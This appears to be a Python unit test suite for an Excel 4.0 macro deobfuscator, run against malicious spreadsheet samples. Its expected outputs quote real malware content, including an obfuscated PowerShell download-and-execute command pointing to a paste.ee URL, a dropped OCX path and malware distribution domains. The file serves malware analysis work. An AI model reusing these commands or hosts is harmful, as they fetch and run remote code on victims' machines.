from test.lib.excel.samples import (
    XLM_MACRO_NAMES_BIFF8,
    XLM_MACRO_TEXT_XLSM,
)
from test.lib.scripts.xlm.modify import (
    date_cell,
    drop_defined_names,
    replace_cell_element,
    replace_cell_formula,
)

from ... import TestUnitBase


def _looping() -> bytes:
    data = XLM_MACRO_TEXT_XLSM
    for cell, formula in (
        ('AZ109', 'FOR.CELL("x",BJ116:BJ117)'),
        ('AZ110', 'SET.VALUE(BD108,x)'),
        ('AZ112', 'NEXT()'),
    ):
        data = replace_cell_formula(data, cell, formula)
    return data


class TestXLMMacroDeobfuscator(TestUnitBase):
    def test_maldoc(self):
        data = self.download_sample(
            'dc44bbfc845fc078cf38b9a3543a32ae1742be8c6320b81cf6cd5a8cee3c696a'
        )
        unit = self.load()
        code = str(data | unit)
        self.assertIn(r'C:\ProgramData\Ropedjo1.ocx', code)

    def test_maldoc_extract_only(self):
        data = self.download_sample(
            'dc44bbfc845fc078cf38b9a3543a32ae1742be8c6320b81cf6cd5a8cee3c696a'
        )
        unit = self.load(extract_only=True)
        code = str(data | unit)
        self.assertIn(r'C:\ProgramData\Ropedjo1.ocx', code)
        self.assertNotIn(r'"h"&"t"&"tp"&":"&"/"&"/"&', code)

    def test_the_trace_spells_the_address_the_status_and_the_formula(self):
        self.assertEqual(
            str(XLM_MACRO_NAMES_BIFF8 | self.load()),
            'CELL:A9591     , PartialEvaluation   , '
            '=EXEC("powershell -Command IEX (new`-OB`jeCT(\'Net.WebClient\')).'
            '\'DoWnloAdsTrInG\'(\'ht\'+\'tp://paste.ee/r/pLpR9\')")',
        )

    def test_the_extract_lists_the_sheet_then_the_formulas_then_the_values(self):
        self.assertEqual(
            str(XLM_MACRO_NAMES_BIFF8 | self.load(extract_only=True)),
            '\n'.join([
                'SHEET: Acf444, macrosheet',
                'CELL:A9591, '
                '=EXEC("powershell -Command IEX (new`-OB`jeCT(\'Net.WebClient\')).'
                '\'DoWnloAdsTrInG\'(\'ht\'+\'tp://paste.ee/r/pLpR9\')"), 33',
                'CELL:A29999, =Application.Quit, #NAME?',
                'CELL:A30009, =HALT(), True',
            ]),
        )

    def test_the_unsorted_extract_lists_the_cells_in_document_order(self):
        self.assertEqual(
            [line.split(',')[0] for line in str(
                XLM_MACRO_TEXT_XLSM | self.load(extract_only=True)
            ).splitlines() if line.startswith('CELL:')],
            [
                'CELL:BD91', 'CELL:BD93', 'CELL:BD95', 'CELL:BD97', 'CELL:BG97', 'CELL:BG98',
                'CELL:BD99', 'CELL:BG99', 'CELL:BG100', 'CELL:BG101', 'CELL:BD104', 'CELL:AZ109',
                'CELL:BF109', 'CELL:AZ110', 'CELL:BF110', 'CELL:BF111', 'CELL:AZ112', 'CELL:BF112',
                'CELL:AZ113', 'CELL:BF113', 'CELL:AZ114', 'CELL:BJ114', 'CELL:AZ115', 'CELL:AZ116',
                'CELL:AZ118', 'CELL:AZ120', 'CELL:AZ121', 'CELL:BJ116', 'CELL:BJ117', 'CELL:BJ118',
                'CELL:BJ119', 'CELL:BJ120',
            ],
        )

    def test_the_sorted_extract_orders_the_formulas_by_address_before_the_values(self):
        self.assertEqual(
            [line.split(',')[0] for line in str(
                XLM_MACRO_TEXT_XLSM | self.load(sort_formulas=True)
            ).splitlines() if line.startswith('CELL:')],
            [
                'CELL:AZ109', 'CELL:AZ110', 'CELL:AZ112', 'CELL:AZ113', 'CELL:AZ114', 'CELL:AZ115',
                'CELL:AZ116', 'CELL:AZ118', 'CELL:AZ120', 'CELL:AZ121', 'CELL:BD91', 'CELL:BD93',
                'CELL:BD95', 'CELL:BD97', 'CELL:BD99', 'CELL:BD104', 'CELL:BF109', 'CELL:BF110',
                'CELL:BF111', 'CELL:BF112', 'CELL:BF113', 'CELL:BG97', 'CELL:BG98', 'CELL:BG99',
                'CELL:BG100', 'CELL:BG101', 'CELL:BJ114', 'CELL:BJ116', 'CELL:BJ117', 'CELL:BJ118',
                'CELL:BJ119', 'CELL:BJ120',
            ],
        )

    def test_the_sorted_extract_lists_formulas_only_beyond_the_extract_flag(self):
        self.assertEqual(
            str(XLM_MACRO_TEXT_XLSM | self.load(sort_formulas=True)),
            str(XLM_MACRO_TEXT_XLSM | self.load(extract_only=True, sort_formulas=True)),
        )

    def test_the_body_of_a_loop_indents_the_trace(self):
        self.assertEqual(
            [line for line in str(_looping() | self.load()).splitlines() if '\t' in line],
            [
                'CELL:AZ110     , FullEvaluation      , \tSET.VALUE(BD108,"ieclb.com.br/ds/3103.")',
                'CELL:AZ110     , FullEvaluation      , \tSET.VALUE(BD108,"maharaniworld.com/ds/3103.")',
            ],
        )

    def test_the_no_indent_flag_drops_the_loop_indentation(self):
        self.assertEqual(
            str(_looping() | self.load(no_indent=True)),
            str(_looping() | self.load()).replace('\t', ''),
        )

    def test_the_trace_reaches_a_cell_only_a_computed_address_names(self):
        data = replace_cell_element(XLM_MACRO_TEXT_XLSM, 'BH120', '<c r="BH120"><f>HALT()</f></c>')
        data = replace_cell_formula(data, 'AZ109', 'GOTO(OFFSET(BG120,0,1))')
        self.assertEqual(
            str(data | self.load()).splitlines(),
            [
                'CELL:AZ109     , FullEvaluation      , GOTO(OFFSET(BG120,0,1))',
                'CELL:BH120     , End                 , HALT()',
            ],
        )

    def test_the_output_format_flag_replaces_the_parts_of_a_trace_line(self):
        self.assertEqual(
            str(XLM_MACRO_TEXT_XLSM | self.load(
                output_formula_format='[[STATUS]]|[[INT-FORMULA]]'
            )).splitlines()[0],
            'FullEvaluation      |SET.VALUE(BD108,"URLMo")',
        )

    def test_the_extract_format_flag_replaces_the_parts_of_a_listing_line(self):
        self.assertEqual(
            str(XLM_MACRO_NAMES_BIFF8 | self.load(
                extract_only=True,
                extract_formula_format='[[CELL-ADDR]]/[[CELL-VALUE]]',
            )).splitlines(),
            [
                'SHEET: Acf444, macrosheet',
                'A9591/33',
                'A29999/#NAME?',
                'A30009/True',
            ],
        )

    def test_the_start_point_flag_runs_where_no_name_points(self):
        nameless = drop_defined_names(XLM_MACRO_TEXT_XLSM)
        self.assertEqual(
            str(nameless | self.load(start_point='Doc1!AZ110')).splitlines()[0],
            'CELL:AZ110     , FullEvaluation      , SET.VALUE(BD109,"URLDownloadToFile")',
        )

    def test_the_day_flag_answers_the_day_command_without_a_search(self):
        data = date_cell(XLM_MACRO_TEXT_XLSM, 'AZ113', '2026-10-01T00:00:00')
        data = replace_cell_formula(data, 'AZ110', 'CHAR(DAY(AZ113)*8)')
        self.assertEqual(
            str(data | self.load(day=17)).splitlines()[1],
            'CELL:AZ110     , FullEvaluation      , \x88',
        )
